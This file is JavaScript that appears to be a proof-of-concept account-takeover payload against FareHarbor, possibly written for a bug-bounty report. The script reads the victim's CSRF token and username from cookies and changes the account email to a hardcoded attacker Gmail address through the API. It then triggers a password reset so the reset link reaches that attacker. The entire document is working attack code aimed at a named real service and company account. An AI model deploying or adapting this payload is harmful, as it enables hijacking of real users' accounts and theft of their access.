const shortname = 'chinaholidaysaud';
const attacker_email = "akberbadsha05@gmail.com";
const csrf = document.cookie.match(/csrftoken=([^;]*)/)[1];
const username = document.cookie.match(/fh-username=([^;]*)/)[1];
var xhrg = new XMLHttpRequest();
xhrg.open('GET', 'https://fareharbor.com/api/v1/companies/'+shortname+'/users/'+username+'/', true);
xhrg.onload = function() {
  if (xhrg.status === 200) {
    var user = JSON.parse(xhrg.responseText).user;
    var xhr = new XMLHttpRequest();
    xhr.open('PUT', 'https://fareharbor.com/api/v1/companies/'+shortname+'/users/'+ user.username +'/', true);
    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    xhr.setRequestHeader('X-Csrftoken', csrf);
    xhr.setRequestHeader('Referer', 'https://fareharbor.com/'+shortname+'/dashboard/settings/permissions/users/'+username+'/settings/');
    xhr.onload = function() {
        if (xhr.status === 200) {
          console.log('Success:', xhr.responseText);
        } else {
          console.error('Error:', xhr.statusText);
        }
      };
    // Set the request payload
    xhr.send(JSON.stringify({
      "username": user.username,
      "name": user.name,
      "is_inactive": "activated",
      "email": attacker_email,
      "group": user.group.pk,
      "partner_group": user.partner_group.pk
    }));

    var reset = new XMLHttpRequest();
    reset.open('POST', 'https://fareharbor.com/api/v1/forgot/password/', true);
    reset.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    reset.setRequestHeader('X-Csrftoken', csrf);
    reset.setRequestHeader('Referer', 'https://fareharbor.com/forgot/password/');
    reset.onload = function() {
        if (reset.status === 200) {
          alert('Password reset email sent to attacker email.');
        } else {
          console.error('Error:', reset.statusText);
        }
      };
    reset.send(JSON.stringify({
        "shortname": shortname,
        "username": user.username
    }));

  } else {
    console.error('Error:', xhrg.statusText);
  }
};
xhrg.send();
